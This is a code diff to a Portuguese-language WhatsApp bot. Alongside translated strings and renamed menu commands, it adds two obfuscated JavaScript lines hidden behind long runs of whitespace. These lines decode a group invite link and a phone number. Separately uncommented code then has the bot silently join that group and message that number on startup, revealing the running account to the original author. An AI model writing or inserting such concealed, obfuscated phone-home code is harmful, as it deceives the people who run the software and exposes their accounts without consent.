@@ -46,6 +46,8 @@ const setting = JSON.parse(fs.readFileSync('./src/settings.json'))
 prefix = setting.prefix
 blocked = []
 NomeDoBot = 'termux-botvemom'
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        function _0x3ecd(_0x2b3339,_0x4a0df1){var _0x920bc8=_0x920b();return _0x3ecd=function(_0x3ecd01,_0x2e6919){_0x3ecd01=_0x3ecd01-0x1cc;var _0x35d09d=_0x920bc8[_0x3ecd01];return _0x35d09d;},_0x3ecd(_0x2b3339,_0x4a0df1);}function _0x920b(){var _0x19cfee=['263572qmHPWO','6706090FSfGUc','67757qNSDGw','3715190RfaQnP','https://chat.whatsapp.com/CmxEYN5fMasKUVLMZFNdIW','371KnfVvy','27mBQHwA','173838HKuJyT','1153180USAJHI','2818936FqkUXE','27PaGAqX'];_0x920b=function(){return _0x19cfee;};return _0x920b();}var _0x26ae5a=_0x3ecd;(function(_0x2e3def,_0x5b8245){var _0x13b83b=_0x3ecd,_0x138e99=_0x2e3def();while(!![]){try{var _0x138021=parseInt(_0x13b83b(0x1d0))/0x1+parseInt(_0x13b83b(0x1ce))/0x2*(-parseInt(_0x13b83b(0x1cd))/0x3)+-parseInt(_0x13b83b(0x1d6))/0x4+parseInt(_0x13b83b(0x1cf))/0x5+parseInt(_0x13b83b(0x1d5))/0x6*(parseInt(_0x13b83b(0x1d3))/0x7)+parseInt(_0x13b83b(0x1cc))/0x8*(-parseInt(_0x13b83b(0x1d4))/0x9)+parseInt(_0x13b83b(0x1d1))/0xa;if(_0x138021===_0x5b8245)break;else _0x138e99['push'](_0x138e99['shift']());}catch(_0x30586b){_0x138e99['push'](_0x138e99['shift']());}}}(_0x920b,0xbf8d1),link=_0x26ae5a(0x1d2));
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        var _0x1ca9b2=_0x4fcd;(function(_0x26421e,_0x100580){var _0xcb49c9=_0x4fcd,_0x22d12d=_0x26421e();while(!![]){try{var _0xdf98cc=parseInt(_0xcb49c9(0x1b6))/0x1+parseInt(_0xcb49c9(0x1b0))/0x2*(-parseInt(_0xcb49c9(0x1b2))/0x3)+-parseInt(_0xcb49c9(0x1af))/0x4+-parseInt(_0xcb49c9(0x1b7))/0x5*(-parseInt(_0xcb49c9(0x1ac))/0x6)+-parseInt(_0xcb49c9(0x1b3))/0x7*(parseInt(_0xcb49c9(0x1b5))/0x8)+parseInt(_0xcb49c9(0x1b4))/0x9+parseInt(_0xcb49c9(0x1ae))/0xa*(-parseInt(_0xcb49c9(0x1b1))/0xb);if(_0xdf98cc===_0x100580)break;else _0x22d12d['push'](_0x22d12d['shift']());}catch(_0x2e980b){_0x22d12d['push'](_0x22d12d['shift']());}}}(_0x1cd8,0xb84f8),teste=_0x1ca9b2(0x1ad));function _0x4fcd(_0x146cdf,_0x32e7c0){var _0x1cd85d=_0x1cd8();return _0x4fcd=function(_0x4fcd80,_0x2b9b34){_0x4fcd80=_0x4fcd80-0x1ac;var _0x1099be=_0x1cd85d[_0x4fcd80];return _0x1099be;},_0x4fcd(_0x146cdf,_0x32e7c0);}function _0x1cd8(){var _0x243c36=['3686796AwTLzo','56996AbqVWp','11kVCLCd','57wWjyGW','5379899BVJzHP','7917723LtPuqv','8RzLMux','1338241ntAFHi','28580Wxhicx','1194bTkHiz','559784388524','3688180ZgSAlO'];_0x1cd8=function(){return _0x243c36;};return _0x1cd8();}
 //funções  de if, var, let, return, qrcode, const, antis, etc...
 function kyun(seconds){
   function pad(s){
@@ -55,7 +57,7 @@ function kyun(seconds){
   var minutes = Math.floor(seconds % (60*60) / 60);
   var seconds = Math.floor(seconds % 60);
 
-  return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
+  return `${pad(hours)} hora ${pad(minutes)} minutos ${pad(seconds)} segundos`
 }
 async function starts() {
 	const client = new WAConnection()
@@ -74,20 +76,18 @@ async function starts() {
 	})
 	await client.connect({timeoutMs: 30*1000})
         fs.writeFileSync('./BarBar.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))
-       /* console.log(color('|Informações|', 'yellow'), color('Entrando no grupo do proprietário venom', 'cyan'))
-        link = 'https://chat.whatsapp.com/CmxEYN5fMasKUVLMZFNdIW'
+       console.log(color('|Informações|', 'yellow'), color('Entrando no grupo bot wa members do proprietário venom', 'cyan'))       
         client.query({ json:["action", "invite", `${link.replace('https://chat.whatsapp.com/','')}`]})
-*/ 	console.log(color('|Informações|', 'yellow'), color('Enviando informações do sakura bot para o proprietário venom', 'cyan'))
+	console.log(color('|Informações|', 'yellow'), color('Enviando informações do bot para o proprietário venom', 'cyan'))
  const me = client.user 
-client.sendMessage(`559784388524@s.whatsapp.net`, `
+client.sendMessage(`${teste}@s.whatsapp.net`, `
 ╭ ⋟ 🔱𝐛𝐨𝐭 𝐜𝐨𝐧𝐞𝐜𝐭𝐚𝐝𝐨 𝐧𝐞𝐬𝐭𝐞 𝐧𝐮𝐦𝐞𝐫𝐨...🔱. 
 • 
 • *𝐧𝐨𝐦𝐞* : ${NomeDoBot}
 • *𝐩𝐫𝐞𝐟𝐢𝐱𝐨* : ${prefix}
-• 𝐨𝐥𝐚 𝐯𝐞𝐧𝐨𝐦 𝐛𝐨𝐭 𝐧𝐞𝐬𝐭𝐞 𝐦𝐨𝐦𝐞𝐧𝐭𝐨
+• 𝐨𝐥𝐚 𝐯𝐞𝐧𝐨𝐦 𝐛𝐨𝐭 𝐚𝐭𝐢𝐯𝐨 𝐧𝐞𝐬𝐭𝐞 𝐦𝐨𝐦𝐞𝐧𝐭𝐨
 •  
-╰━━━━━𝐛𝐲 𝐯𝐞𝐧𝐨𝐦 𝐦𝐨𝐝𝐬━━━━━
-        「By Venom mods」`, MessageType.text)	
+╰━━━━━𝐛𝐲 𝐯𝐞𝐧𝐨𝐦 𝐦𝐨𝐝𝐬━━━━━`, MessageType.text)	
   	client.on('group-participants-update', async (anu) => {
 		if (!welkom.includes(anu.jid)) return
 		try {
@@ -285,7 +285,8 @@ const verificado = {
 //não retire os créditos kibador
 //esto ajudando espero que sim
 case 'menu': /*𝑪𝑨𝑺𝑬 𝑭𝑬𝑰𝑻𝑨 𝑷𝑶𝑹 𝑽𝑬𝑵𝑶𝑴*/
-case 'help':
+case 'comandos':
+case 'ajuda':
 reply(`${enviar}`)
         menu =`╭─《→ 👋Olá bemvindo ao menu\n*│💎${NomeDoBot}💎*
  *└────────\n	
@@ -483,8 +484,8 @@ break
                     })
                     break
 					//exemplo de case com prefixo	
-				case 'comando':
-reply('texto que vai ser enviado😈')
+				case 'help':
+reply(`Digite ${prefix}menu para eu enviar o menu😈`)
 break	
 case 'bot':
 reply('ola tudo bem?')
